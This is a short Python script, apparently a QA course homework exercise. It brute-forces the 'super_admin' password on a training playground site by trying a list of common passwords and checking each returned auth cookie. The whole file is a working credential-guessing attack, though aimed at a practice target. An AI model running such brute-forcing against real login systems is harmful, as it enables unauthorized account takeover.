import requests


login = "super_admin"
url1 = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

passwords = [
    "123456", "password", "123456789", "12345678", "12345", "1234567",
    "1234567890", "admin", "qwerty", "123123", "letmein", "monkey",
    "dragon", "111111", "baseball", "iloveyou", "trustno1", "1234567",
    "sunshine", "master", "123123", "welcome", "shadow", "ashley", "football"
]

for password in passwords:
    payload = {"login": login, "password": password}
    response1 = requests.post(url1, data=payload)

    if response1.status_code != 500:
        auth_cookie = response1.cookies.get("auth_cookie")

        if auth_cookie:
            cookies = {"auth_cookie": auth_cookie}
            response2 = requests.post(url2, cookies=cookies)
            if response2.text == "You are authorized":
                print(f"Password is: {password}")
                break
